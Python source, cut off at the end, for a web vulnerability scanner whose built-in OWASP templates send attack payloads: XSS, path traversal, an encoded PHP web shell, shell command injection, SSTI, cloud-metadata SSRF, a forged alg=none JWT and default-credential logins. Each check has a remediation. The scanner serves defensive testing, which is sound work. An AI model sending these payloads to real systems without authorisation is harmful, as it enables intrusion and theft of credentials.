"""
Quantara Web Vulnerability Scanner v2.0
======================================

State-of-the-art OWASP Top 10 scanner combining:
  1. Quantara YAML template execution (loads from Quantara_Payloads_Templates/)
  2. Built-in OWASP Top 10 detection modules (defined in Python)
  3. Technology fingerprinting (stack-aware template selection)
  4. Async concurrent scanning with configurable concurrency
  5. UnifiedFinding-compatible output (works with orchestrator.py)

OWASP Top 10:2021 Coverage:
  A01 - Broken Access Control
  A02 - Cryptographic Failures
  A03 - Injection (SQLi, XSS, Cmd, SSTI, CRLF, LFI)
  A04 - Insecure Design
  A05 - Security Misconfiguration (headers, CORS, debug endpoints)
  A06 - Vulnerable/Outdated Components
  A07 - Identification & Authentication Failures
  A08 - Software & Data Integrity Failures
  A09 - Security Logging & Monitoring Failures
  A10 - Server-Side Request Forgery (SSRF)

Usage:
    scanner = QuantaraWebScanner()
    findings = scanner.scan("https://target.com")
    # findings is list[UnifiedFinding] compatible with orchestrator
"""

from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import sys
import time
import warnings
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional
from urllib.parse import urlparse, urljoin, urlencode, urlunparse, parse_qs

logger = logging.getLogger("owasp_scanner.quantara_scanner")

# ─────────────────────────────────────────────────────────────────────────────
# Local imports
# ─────────────────────────────────────────────────────────────────────────────

_HERE = Path(__file__).resolve().parent
if str(_HERE) not in sys.path:
    sys.path.insert(0, str(_HERE))

try:
    from quantara_engine import (
        QuantaraEngine, QuantaraTemplate, QuantaraHTTPRequest, QuantaraMatcher,
        QuantaraExtractor, TemplateMatch, QuantaraResponse, HTTPEngine,
        MatcherEngine, ExtractorEngine, FuzzingEngine, TemplateRunner,
        VariableResolver,
    )
    ENGINE_AVAILABLE = True
except ImportError as e:
    logger.warning(f"quantara_engine not available: {e}")
    ENGINE_AVAILABLE = False

try:
    from tech_fingerprinting import TechFingerprinter, fingerprint_response, analyze_security_headers
    FINGERPRINT_AVAILABLE = True
except ImportError as e:
    logger.warning(f"tech_fingerprinting not available: {e}")
    FINGERPRINT_AVAILABLE = False

# ─────────────────────────────────────────────────────────────────────────────
# Project root path for finding Quantara_Payloads_Templates
# ─────────────────────────────────────────────────────────────────────────────

_PROJECT_ROOT = _HERE.parent.parent   # Owasp_Scanner_Final/
_TEMPLATES_DIR = _PROJECT_ROOT / "Quantara_Payloads_Templates"
_TEMPLATES_DIR_ALT = _HERE.parent.parent.parent / "Quantara_Payloads_Templates"


def _find_templates_dir() -> Optional[Path]:
    """Locate the Quantara_Payloads_Templates directory."""
    candidates = [
        _TEMPLATES_DIR,
        _TEMPLATES_DIR_ALT,
        Path(os.getenv("QUANTARA_TEMPLATES_DIR", "")) if os.getenv("QUANTARA_TEMPLATES_DIR") else None,
    ]
    for path in candidates:
        if path and path.exists() and path.is_dir():
            return path
    return None


# ─────────────────────────────────────────────────────────────────────────────
# UnifiedFinding-compatible output model
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class QuantaraWebFinding:
    """
    Scanner finding compatible with orchestrator's UnifiedFinding.
    Mirrors the UnifiedFinding dataclass fields used in normalize_finding().
    """
    id: str
    file: str                   # URL (treated as "file" in unified model)
    line_number: int = 0
    severity: str = "info"
    title: str = ""
    description: str = ""
    matched_content: str = ""
    category: str = ""
    cwe: str = ""
    remediation: str = ""
    confidence: float = 0.9
    module: str = "quantara_http"
    module_name: str = "Quantara HTTP Scanner"
    owasp: str = ""
    language: str = "http"
    tags: list = field(default_factory=list)
    timestamp: str = ""
    finding_type: str = ""
    scanner_source: str = "quantara"
    template_id: str = ""
    endpoint: str = ""
    curl_command: str = ""
    tech_stack: list = field(default_factory=list)

    def to_dict(self) -> dict:
        return {k: v for k, v in self.__dict__.items() if v is not None and v != "" and v != []}


# ─────────────────────────────────────────────────────────────────────────────
# Built-in OWASP Top 10 Template Definitions
# ─────────────────────────────────────────────────────────────────────────────

def _build_builtin_templates() -> list[QuantaraTemplate]:
    """Build built-in OWASP Top 10 templates defined in Python."""
    templates = []

    # ── A01: Broken Access Control ────────────────────────────────────

    # IDOR probe: access /api/users/1, /api/users/2
    idor_t = QuantaraTemplate(
        id="builtin-idor-probe",
        name="IDOR: User Object Enumeration",
        severity="high",
        description="Tests for Insecure Direct Object Reference by probing sequential user IDs.",
        owasp="A01:2021",
        cwe="CWE-639",
        tags=["idor", "access-control", "owasp-top10"],
    )
    idor_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=[
            "{{BaseURL}}/api/users/1",
            "{{BaseURL}}/api/users/2",
            "{{BaseURL}}/api/v1/users/1",
            "{{BaseURL}}/api/v2/users/1",
            "{{BaseURL}}/users/1",
            "{{BaseURL}}/profile/1",
            "{{BaseURL}}/account/1",
            "{{BaseURL}}/api/orders/1",
            "{{BaseURL}}/api/admin/users/1",
        ],
        matchers=[
            QuantaraMatcher(type="status", status=[200]),
            QuantaraMatcher(
                type="word", part="body",
                words=["email", "username", "id", "user_id", "userId", "password", "phone", "address"],
                condition="or",
            ),
        ],
        matchers_condition="and",
    ))
    templates.append(idor_t)

    # Admin panel exposure
    admin_t = QuantaraTemplate(
        id="builtin-admin-panel",
        name="Admin Panel Exposure",
        severity="high",
        description="Checks for publicly accessible admin panel paths.",
        owasp="A01:2021",
        cwe="CWE-284",
        tags=["admin", "access-control", "owasp-top10"],
    )
    admin_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=[
            "{{BaseURL}}/admin",
            "{{BaseURL}}/admin/",
            "{{BaseURL}}/admin/login",
            "{{BaseURL}}/administrator",
            "{{BaseURL}}/backend",
            "{{BaseURL}}/wp-admin",
            "{{BaseURL}}/phpmyadmin",
            "{{BaseURL}}/adminer",
            "{{BaseURL}}/adminer.php",
            "{{BaseURL}}/manage",
            "{{BaseURL}}/dashboard",
            "{{BaseURL}}/control",
            "{{BaseURL}}/panel",
            "{{BaseURL}}/cpanel",
            "{{BaseURL}}/.env",
            "{{BaseURL}}/.git/config",
            "{{BaseURL}}/.git/HEAD",
        ],
        matchers=[
            QuantaraMatcher(type="status", status=[200, 301, 302, 401, 403]),
        ],
        matchers_condition="or",
        stop_at_first_match=False,
    ))
    templates.append(admin_t)

    # ── A02: Cryptographic Failures ────────────────────────────────────

    # Sensitive data in response
    sensitive_t = QuantaraTemplate(
        id="builtin-sensitive-data",
        name="Sensitive Data in HTTP Response",
        severity="high",
        description="Detects PII, credentials, or sensitive data patterns in HTTP responses.",
        owasp="A02:2021",
        cwe="CWE-312",
        tags=["sensitive-data", "crypto-failure", "owasp-top10"],
    )
    sensitive_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=["{{BaseURL}}", "{{BaseURL}}/api/", "{{BaseURL}}/api/v1/"],
        matchers=[
            QuantaraMatcher(
                type="regex", part="body",
                regex=[
                    # API keys and tokens
                    r"(?i)(api[_-]?key|apikey|api[_-]?secret)\s*[=:\"'`]\s*['\"]?([A-Za-z0-9+/=\-_]{20,})",
                    r"(?i)(secret|secret_key|access_key|private_key)\s*[=:\"'`]\s*['\"]?([A-Za-z0-9+/=\-_]{16,})",
                    # AWS credentials
                    r"AKIA[0-9A-Z]{16}",
                    # JWT tokens
                    r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
                    # Basic auth
                    r"(?i)Authorization: Basic [A-Za-z0-9+/]+=*",
                    # Credit card patterns
                    r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b",
                    # Social Security Numbers
                    r"\b\d{3}-\d{2}-\d{4}\b",
                    # Email/password combos
                    r'"password"\s*:\s*"[^"]{4,}"',
                ],
                condition="or",
            ),
        ],
        matchers_condition="or",
    ))
    templates.append(sensitive_t)

    # ── A03: Injection ─────────────────────────────────────────────────

    # XSS reflected detection
    xss_t = QuantaraTemplate(
        id="builtin-reflected-xss",
        name="Reflected Cross-Site Scripting (XSS)",
        severity="high",
        description="Tests for reflected XSS by injecting script payloads into query parameters.",
        owasp="A03:2021",
        cwe="CWE-79",
        tags=["xss", "injection", "owasp-top10"],
    )
    xss_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=["{{BaseURL}}"],
        payloads={
            "xss_payload": [
                "<script>alert(1)</script>",
                '"><script>alert(1)</script>',
                "javascript:alert(1)",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "'><svg onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
                '"><img src=x onerror="alert(1)">',
                "<body onload=alert(1)>",
                "{{constructor.constructor('alert(1)')()}}",
            ],
        },
        fuzzing=[{
            "part": "query",
            "type": "replace",
            "mode": "single",
            "fuzz": ["{{xss_payload}}"],
        }],
        matchers=[
            QuantaraMatcher(
                type="word", part="body",
                words=["<script>alert(1)</script>", "javascript:alert(1)",
                       "onerror=alert(1)", "onload=alert(1)", "<svg/onload"],
                condition="or",
            ),
            QuantaraMatcher(
                type="status", status=[200],
            ),
        ],
        matchers_condition="and",
    ))
    templates.append(xss_t)

    # LFI / Path Traversal
    lfi_t = QuantaraTemplate(
        id="builtin-lfi-traversal",
        name="Local File Inclusion / Path Traversal",
        severity="critical",
        description="Tests for Local File Inclusion and path traversal vulnerabilities.",
        owasp="A03:2021",
        cwe="CWE-22",
        tags=["lfi", "path-traversal", "injection", "owasp-top10"],
    )
    lfi_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=["{{BaseURL}}"],
        payloads={
            "lfi_payload": [
                "../../../../etc/passwd",
                "../../../../etc/passwd%00",
                "../../../../windows/win.ini",
                "../../../etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "/etc/passwd",
                "file:///etc/passwd",
                "php://filter/read=convert.base64-encode/resource=/etc/passwd",
                "php://input",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
                "expect://id",
            ],
        },
        fuzzing=[{
            "part": "query",
            "type": "replace",
            "mode": "single",
            "fuzz": ["{{lfi_payload}}"],
        }],
        matchers=[
            QuantaraMatcher(
                type="regex", part="body",
                regex=[
                    r"root:[x*]:0:0:",                          # /etc/passwd
                    r"\[fonts\]|for 16-bit app support",        # win.ini
                    r"DOCUMENT_ROOT|HTTP_USER_AGENT|PATH",      # PHP env
                ],
                condition="or",
            ),
        ],
        matchers_condition="or",
    ))
    templates.append(lfi_t)

    # Command Injection
    cmdi_t = QuantaraTemplate(
        id="builtin-command-injection",
        name="Command Injection (OS Command Injection)",
        severity="critical",
        description="Tests for OS command injection via query parameters.",
        owasp="A03:2021",
        cwe="CWE-78",
        tags=["rce", "command-injection", "injection", "owasp-top10"],
    )
    cmdi_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=["{{BaseURL}}"],
        payloads={
            "cmd_payload": [
                ";id",
                "&&id",
                "|id",
                "$(id)",
                "`id`",
                ";cat /etc/passwd",
                "|cat /etc/passwd",
                "&&cat /etc/passwd",
                "||cat /etc/passwd",
                ";\nid",
                "%0aid",
                "%0a%0acat%20/etc/passwd",
                ";sleep 5",
                "&&sleep 5",
            ],
        },
        fuzzing=[{
            "part": "query",
            "type": "postfix",
            "mode": "single",
            "fuzz": ["{{cmd_payload}}"],
        }],
        matchers=[
            QuantaraMatcher(
                type="regex", part="body",
                regex=[
                    r"uid=\d+\(.*?\) gid=\d+",        # Unix id output
                    r"root:[x*]:0:0:",                  # /etc/passwd
                    r"(www-data|apache|nginx|nobody)",  # common web user
                ],
                condition="or",
            ),
        ],
        matchers_condition="or",
    ))
    templates.append(cmdi_t)

    # SSTI (Server-Side Template Injection)
    ssti_t = QuantaraTemplate(
        id="builtin-ssti",
        name="Server-Side Template Injection (SSTI)",
        severity="critical",
        description="Tests for SSTI in Jinja2, Twig, Freemarker, ERB, and others.",
        owasp="A03:2021",
        cwe="CWE-94",
        tags=["ssti", "injection", "rce", "owasp-top10"],
    )
    ssti_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=["{{BaseURL}}"],
        payloads={
            "ssti_payload": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{7*'7'}}",
                "${7*'7'}",
                "<%= 7*7 %>",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "%7B%7B7*7%7D%7D",
                "${{<%[%'\"}}%\\",
            ],
        },
        fuzzing=[{
            "part": "query",
            "type": "replace",
            "mode": "single",
            "fuzz": ["{{ssti_payload}}"],
        }],
        matchers=[
            QuantaraMatcher(
                type="word", part="body",
                words=["49", "7777777"],
                condition="or",
            ),
            QuantaraMatcher(
                type="regex", part="body",
                regex=[r"uid=\d+\(", r"\[<class '"],
                condition="or",
            ),
        ],
        matchers_condition="or",
    ))
    templates.append(ssti_t)

    # ── A05: Security Misconfiguration ─────────────────────────────────

    # Debug endpoints
    debug_t = QuantaraTemplate(
        id="builtin-debug-endpoints",
        name="Debug/Development Endpoints Exposed",
        severity="high",
        description="Checks for exposed debug endpoints, stack traces, and development artifacts.",
        owasp="A05:2021",
        cwe="CWE-200",
        tags=["debug", "exposure", "misconfig", "owasp-top10"],
    )
    debug_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=[
            "{{BaseURL}}/debug",
            "{{BaseURL}}/debug/",
            "{{BaseURL}}/phpinfo.php",
            "{{BaseURL}}/info.php",
            "{{BaseURL}}/test.php",
            "{{BaseURL}}/server-status",
            "{{BaseURL}}/server-info",
            "{{BaseURL}}/__debug__",
            "{{BaseURL}}/actuator",
            "{{BaseURL}}/actuator/env",
            "{{BaseURL}}/actuator/health",
            "{{BaseURL}}/actuator/beans",
            "{{BaseURL}}/actuator/mappings",
            "{{BaseURL}}/metrics",
            "{{BaseURL}}/health",
            "{{BaseURL}}/status",
            "{{BaseURL}}/trace",
            "{{BaseURL}}/heapdump",
            "{{BaseURL}}/threaddump",
            "{{BaseURL}}/api-docs",
            "{{BaseURL}}/swagger",
            "{{BaseURL}}/swagger-ui.html",
            "{{BaseURL}}/swagger-ui",
            "{{BaseURL}}/openapi.json",
            "{{BaseURL}}/v2/api-docs",
            "{{BaseURL}}/v3/api-docs",
            "{{BaseURL}}/graphql",
            "{{BaseURL}}/graphql/playground",
            "{{BaseURL}}/graphiql",
        ],
        matchers=[
            QuantaraMatcher(type="status", status=[200]),
            QuantaraMatcher(
                type="word", part="body",
                words=[
                    "phpinfo()", "PHP_VERSION", "PHP Version", "phpMyAdmin",
                    "DEBUG", "traceback", "Traceback", "stack trace",
                    "java.lang", "at org.springframework", "DispatcherServlet",
                    "spring boot", "actuator", "environment",
                    "swagger", "openapi", "Swagger UI", "ReDoc",
                    "__schema", "graphql", "mutation",
                ],
                condition="or",
            ),
        ],
        matchers_condition="and",
        stop_at_first_match=False,
    ))
    templates.append(debug_t)

    # Backup files
    backup_t = QuantaraTemplate(
        id="builtin-backup-files",
        name="Backup File Disclosure",
        severity="high",
        description="Checks for exposed backup, config, and sensitive files.",
        owasp="A05:2021",
        cwe="CWE-200",
        tags=["backup", "exposure", "misconfig", "owasp-top10"],
    )
    backup_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=[
            "{{BaseURL}}/.env",
            "{{BaseURL}}/.env.backup",
            "{{BaseURL}}/.env.local",
            "{{BaseURL}}/.env.production",
            "{{BaseURL}}/.env.development",
            "{{BaseURL}}/config.php",
            "{{BaseURL}}/config.php.bak",
            "{{BaseURL}}/wp-config.php",
            "{{BaseURL}}/wp-config.php.bak",
            "{{BaseURL}}/settings.py",
            "{{BaseURL}}/settings.php",
            "{{BaseURL}}/database.yml",
            "{{BaseURL}}/secrets.yml",
            "{{BaseURL}}/credentials.yml",
            "{{BaseURL}}/backup.sql",
            "{{BaseURL}}/dump.sql",
            "{{BaseURL}}/site.sql",
            "{{BaseURL}}/backup.zip",
            "{{BaseURL}}/backup.tar.gz",
            "{{BaseURL}}/.git/config",
            "{{BaseURL}}/.svn/entries",
            "{{BaseURL}}/robots.txt",
            "{{BaseURL}}/sitemap.xml",
            "{{BaseURL}}/crossdomain.xml",
            "{{BaseURL}}/clientaccesspolicy.xml",
        ],
        matchers=[
            QuantaraMatcher(type="status", status=[200]),
            QuantaraMatcher(
                type="word", part="body",
                words=[
                    "DB_PASSWORD", "DB_HOST", "DATABASE_URL", "SECRET_KEY",
                    "APP_SECRET", "STRIPE_", "AWS_", "PRIVATE_KEY",
                    "[database]", "password =", "api_key",
                    "repositoryformatversion", "filemode",
                ],
                condition="or",
            ),
        ],
        matchers_condition="and",
        stop_at_first_match=False,
    ))
    templates.append(backup_t)

    # ── A07: Authentication Failures ───────────────────────────────────

    # Default credentials check
    default_creds_t = QuantaraTemplate(
        id="builtin-default-credentials",
        name="Default Credentials Test",
        severity="critical",
        description="Tests for default admin/admin, admin/password, and common default credentials.",
        owasp="A07:2021",
        cwe="CWE-521",
        tags=["auth", "default-creds", "owasp-top10"],
    )
    default_creds_t.http_requests.append(QuantaraHTTPRequest(
        method="POST",
        paths=[
            "{{BaseURL}}/login",
            "{{BaseURL}}/admin/login",
            "{{BaseURL}}/wp-login.php",
            "{{BaseURL}}/user/login",
            "{{BaseURL}}/api/login",
            "{{BaseURL}}/api/auth",
            "{{BaseURL}}/api/v1/login",
            "{{BaseURL}}/signin",
        ],
        payloads={
            "username": ["admin", "administrator", "root", "user", "test"],
            "password": ["admin", "password", "123456", "admin123", "password123", "root"],
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        matchers=[
            QuantaraMatcher(
                type="status", status=[200, 302, 301],
            ),
            QuantaraMatcher(
                type="word", part="body",
                words=["dashboard", "welcome", "logout", "profile", "admin",
                       "access_token", "auth_token", "session_token", "token"],
                condition="or",
            ),
            QuantaraMatcher(
                type="word", part="body",
                words=["invalid", "incorrect", "error", "failed", "wrong password",
                       "unauthorized", "denied", "try again"],
                negative=True,
                condition="or",
            ),
        ],
        matchers_condition="and",
    ))
    templates.append(default_creds_t)

    # JWT None Algorithm Attack
    jwt_t = QuantaraTemplate(
        id="builtin-jwt-none-alg",
        name="JWT None Algorithm Vulnerability",
        severity="critical",
        description="Tests if the server accepts JWT tokens signed with the 'none' algorithm.",
        owasp="A07:2021",
        cwe="CWE-347",
        tags=["jwt", "auth", "owasp-top10"],
    )
    jwt_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=[
            "{{BaseURL}}/api/profile",
            "{{BaseURL}}/api/v1/profile",
            "{{BaseURL}}/api/me",
            "{{BaseURL}}/api/user",
            "{{BaseURL}}/api/admin",
        ],
        headers={
            # JWT with none algorithm: {"alg":"none","typ":"JWT"}.{"sub":"admin","iat":1}
            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0.",
        },
        matchers=[
            QuantaraMatcher(type="status", status=[200]),
            QuantaraMatcher(
                type="word", part="body",
                words=["email", "username", "id", "role", "admin"],
                condition="or",
            ),
        ],
        matchers_condition="and",
    ))
    templates.append(jwt_t)

    # ── A10: SSRF ─────────────────────────────────────────────────────

    # Cloud metadata SSRF
    ssrf_t = QuantaraTemplate(
        id="builtin-ssrf-metadata",
        name="SSRF - Cloud Metadata Service Access",
        severity="critical",
        description="Tests for SSRF by injecting cloud metadata service URLs into parameters.",
        owasp="A10:2021",
        cwe="CWE-918",
        tags=["ssrf", "cloud", "aws", "owasp-top10"],
    )
    ssrf_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=["{{BaseURL}}"],
        payloads={
            "ssrf_url": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://100.100.100.200/latest/meta-data/",
                "http://169.254.169.254/metadata/v1",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://127.0.0.1:22",
                "http://127.0.0.1:3306",
                "http://localhost:6379",
                "http://localhost:27017",
                "http://0.0.0.0:80",
                "dict://127.0.0.1:6379/info",
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
            ],
        },
        fuzzing=[{
            "part": "query",
            "type": "replace",
            "mode": "single",
            "keys": ["url", "uri", "redirect", "callback", "data",
                     "next", "dest", "target", "path", "file",
                     "img", "image", "src", "host", "domain"],
            "fuzz": ["{{ssrf_url}}"],
        }],
        matchers=[
            QuantaraMatcher(
                type="regex", part="body",
                regex=[
                    r"ami-id|instance-id|instance-type|placement|security-groups",
                    r"AccessKeyId|SecretAccessKey|Token",
                    r"metadata\.google\.internal",
                    r"project-id|numeric-project-id",
                    r"root:[x*]:0:0:",
                    r"\[fonts\]|for 16-bit",
                ],
                condition="or",
            ),
        ],
        matchers_condition="or",
    ))
    templates.append(ssrf_t)

    # ── A06: Outdated Components ───────────────────────────────────────

    # WordPress version detection
    wp_version_t = QuantaraTemplate(
        id="builtin-wordpress-version",
        name="WordPress Version Disclosure",
        severity="medium",
        description="Detects WordPress version from meta generator tag.",
        owasp="A06:2021",
        cwe="CWE-200",
        tags=["wordpress", "version-detection", "cms"],
    )
    wp_version_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=["{{BaseURL}}", "{{BaseURL}}/feed/"],
        matchers=[
            QuantaraMatcher(
                type="regex", part="body",
                regex=[r"WordPress\s+(\d+\.\d+(?:\.\d+)?)"],
                condition="or",
            ),
        ],
        matchers_condition="or",
        extractors=[
            QuantaraExtractor(
                type="regex",
                name="wordpress_version",
                regex=[r"WordPress\s+(\d+\.\d+(?:\.\d+)?)"],
                group=1,
            ),
        ],
    ))
    templates.append(wp_version_t)

    # PHP version disclosure
    php_version_t = QuantaraTemplate(
        id="builtin-php-version",
        name="PHP Version Disclosure",
        severity="low",
        description="PHP version is exposed via X-Powered-By header, enabling targeted attacks.",
        owasp="A05:2021",
        cwe="CWE-200",
        tags=["php", "version-detection", "misconfig"],
    )
    php_version_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=["{{BaseURL}}"],
        matchers=[
            QuantaraMatcher(
                type="regex", part="header",
                regex=[r"PHP/\d+\.\d+"],
                condition="or",
            ),
        ],
        matchers_condition="or",
    ))
    templates.append(php_version_t)

    # ── A08: Software Integrity Failures ──────────────────────────────

    # Insecure HTTP PUT method
    put_t = QuantaraTemplate(
        id="builtin-http-put",
        name="HTTP PUT Method Enabled",
        severity="medium",
        description="Server allows HTTP PUT method, potentially enabling file upload attacks.",
        owasp="A05:2021",
        cwe="CWE-650",
        tags=["put", "http-method", "upload", "misconfig"],
    )
    put_t.http_requests.append(QuantaraHTTPRequest(
        method="PUT",
        paths=["{{BaseURL}}/quantara-test.html"],
        body="<html>Quantara-Test</html>",
        headers={"Content-Type": "text/html"},
        matchers=[
            QuantaraMatcher(type="status", status=[200, 201, 204, 403]),
            QuantaraMatcher(
                type="status", status=[405, 404, 501],
                negative=True,
            ),
        ],
        matchers_condition="and",
    ))
    templates.append(put_t)

    # Source code disclosure
    source_t = QuantaraTemplate(
        id="builtin-source-code-disclosure",
        name="Source Code Disclosure",
        severity="high",
        description="Checks for exposed source code files and database dumps.",
        owasp="A05:2021",
        cwe="CWE-540",
        tags=["source-code", "disclosure", "backup"],
    )
    source_t.http_requests.append(QuantaraHTTPRequest(
        method="GET",
        paths=[
            "{{BaseURL}}/index.php.bak",
            "{{BaseURL}}/index.php~",
            "{{BaseURL}}/application.tar.gz",
            "{{BaseURL}}/source.zip",
            "{{BaseURL}}/app.tar.gz",
            "{{BaseURL}}/web.config",
            "{{BaseURL}}/appsettings.json",
            "{{BaseURL}}/appsettings.Development.json",
            "{{BaseURL}}/application.properties",
            "{{BaseURL}}/application.yml",
            "{{BaseURL}}/config/database.php",
            "{{BaseURL}}/.DS_Store",
            "{{BaseURL}}/.htaccess",
            "{{BaseURL}}/Dockerfile",
            "{{BaseURL}}/docker-compose.yml",
            "{{BaseURL}}/docker-compose.yaml",
            "{{BaseURL}}/Makefile",
            "{{BaseURL}}/package.json",
        ],
        matchers=[
            QuantaraMatcher(type="status", status=[200]),
            QuantaraMatcher(
                type="word", part="body",
                words=[
                    "<?php", "DB_PASSWORD", "connectionString",
                    "FROM node", "FROM python", "FROM ubuntu",
                    "app_secret", "database:", "redis:", "password:",
                ],
                condition="or",
            ),
        ],
        matchers_condition="and",
        stop_at_first_match=False,
    ))
    templates.append(source_t)

    # ── Additional: Rate limiting check ───────────────────────────────

    # Missing rate limiting on auth endpoints
    rate_t = QuantaraTemplate(
        id="builtin-rate-limit-check",
        name="Missing Rate Limiting on Authentication",
        severity="medium",
        description="Authentication endpoint may lack rate limiting, enabling brute force attacks.",
        owasp="A07:2021",
        cwe="CWE-307",
        tags=["brute-force", "rate-limit", "auth"],
    )
    rate_t.http_requests.append(QuantaraHTTPRequest(
        method="POST",
        paths=[
            "{{BaseURL}}/login",
            "{{BaseURL}}/api/login",
            "{{BaseURL}}/api/v1/login",
            "{{BaseURL}}/api/auth",
        ],
        headers={"Content-Type": "application/json"},
        body='{"username":"test","password":"wrongpassword_quantara_probe"}',
        matchers=[
            QuantaraMatcher(
                type="status", status=[429, 423, 503],
                negative=True,  # no rate limit = match (bad)
            ),
            QuantaraMatcher(
                type="status", status=[400, 401, 403, 422],
            ),
            QuantaraMatcher(
                type="word", part="header",
                words=["x-ratelimit-limit", "x-rate-limit", "retry-after", "ratelimit"],
                negative=True,  # no rate limit header = bad
            ),
        ],
        matchers_condition="and",
    ))
    templates.append(rate_t)

    # ── GraphQL Introspection ─────────────────────────────────────────
    graphql_t = QuantaraTemplate(
        id="builtin-graphql-introspection",
        name="GraphQL Introspection Enabled",
        severity="medium",
        description="GraphQL introspection is enabled, exposing the full API schema.",
        owasp="A05:2021",
        cwe="CWE-200",
        tags=["graphql", "api", "disclosure"],
    )
    graphql_t.http_requests.append(QuantaraHTTPRequest(
        method="POST",
        paths=[
            "{{BaseURL}}/graphql",
            "{{BaseURL}}/api/graphql",
            "{{BaseURL}}/v1/graphql",
            "{{BaseURL}}/graphql/v1",
        ],
        headers={"Content-Type": "application/json"},
        body='{"query":"{__schema{types{name}}}"}',
        matchers=[
            QuantaraMatcher(type="status", status=[200]),
            QuantaraMatcher(
                type="word", part="body",
                words=["__schema", "__type", "types"],
                condition="and",
            ),
        ],
        matchers_condition="and",
    ))
    templates.append(graphql_t)

    return templates


# ─────────────────────────────────────────────────────────────────────────────
# OWASP Remediation Map
# ─────────────────────────────────────────────────────────────────────────────

REMEDIATION_MAP: dict[str, str] = {
    "builtin-idor-probe":           "Implement server-side authorization checks on all resource access. Never rely on client-provided IDs alone. Use UUIDs instead of sequential IDs. Validate user ownership before returning data.",
    "builtin-admin-panel":          "Restrict admin panel access by IP whitelist, VPN, or 2FA. Ensure admin routes are not publicly accessible. Remove or password-protect default paths.",
    "builtin-sensitive-data":       "Remove sensitive data from HTTP responses. Implement field-level access control. Encrypt sensitive data at rest and in transit. Use data masking for PII in logs.",
    "builtin-reflected-xss":        "Implement proper output encoding for all user-controlled data. Use Content-Security-Policy headers. Sanitize input with an allowlist approach. Use modern framework auto-escaping.",
    "builtin-lfi-traversal":        "Never use user input to construct file paths. Use realpath() and validate paths are within allowed directories. Disable PHP file wrappers (php.ini: allow_url_include=Off).",
    "builtin-command-injection":    "Never pass user input to OS commands. Use language-native libraries instead of shell. If shell is required, use parameterized commands and strict input validation.",
    "builtin-ssti":                 "Use a sandboxed template engine or disable dangerous template features. Never concatenate user input into template strings. Use {{variable}} escaping, not raw string interpolation.",
    "builtin-debug-endpoints":      "Remove or restrict debug endpoints in production. Disable Spring Actuator endpoints or require authentication. Remove phpinfo(), error display settings, and debug flags.",
    "builtin-backup-files":         "Remove backup files from web-accessible directories. Configure web server to deny access to .bak, .old, .sql, .env files. Use .gitignore to prevent committing secrets.",
    "builtin-default-credentials":  "Change all default credentials immediately after installation. Enforce strong password policies. Implement account lockout after failed attempts. Use MFA.",
    "builtin-jwt-none-alg":         "Always validate the JWT algorithm explicitly. Reject tokens with alg=none. Use RS256 or ES256 with asymmetric keys. Validate all JWT claims (exp, iss, aud).",
    "builtin-ssrf-metadata":        "Validate and sanitize all URLs provided by users. Implement an allowlist of permitted external hosts. Block internal IP ranges (169.254.0.0/16, 10.0.0.0/8) at the network level.",
    "builtin-http-put":             "Disable HTTP PUT and DELETE methods unless specifically required by the API. Configure web server to reject these methods: `LimitExcept GET POST { Deny all }`",
    "builtin-source-code-disclosure": "Remove all backup files from production servers. Configure web server to deny access to source files. Add backup file extensions to .htaccess deny rules.",
    "builtin-rate-limit-check":     "Implement rate limiting on all authentication endpoints. Use exponential backoff. Implement account lockout. Use CAPTCHA after threshold. Consider using API gateway rate limiting.",
    "builtin-graphql-introspection": "Disable GraphQL introspection in production. Use query depth limiting, query complexity analysis, and field-level authorization.",
    "builtin-wordpress-version":    "Hide WordPress version from meta tags (remove_action hook). Update to latest WordPress version. Use a WAF to block version enumeration.",
    "builtin-php-version":          "Remove X-Powered-By header in php.ini: expose_php = Off. Keep PHP updated to latest stable version.",
    # YAML template fallbacks
    "error-sqli":                   "Use parameterized queries/prepared statements for all database queries. Never concatenate user input into SQL. Use an ORM. Implement database WAF rules.",
    "cors-misconfig":               "Restrict CORS to specific trusted origins. Never combine Allow-Origin: * with Allow-Credentials: true. Validate Origin header server-side.",
    "openRedirect":                 "Never use unvalidated user input in redirect destinations. Implement an allowlist of permitted redirect URLs. Use relative paths for internal redirects.",
    "response-ssrf":                "Block outbound connections to internal IPs via firewall. Validate and sanitize all user-provided URLs. Use an HTTP allowlist proxy.",
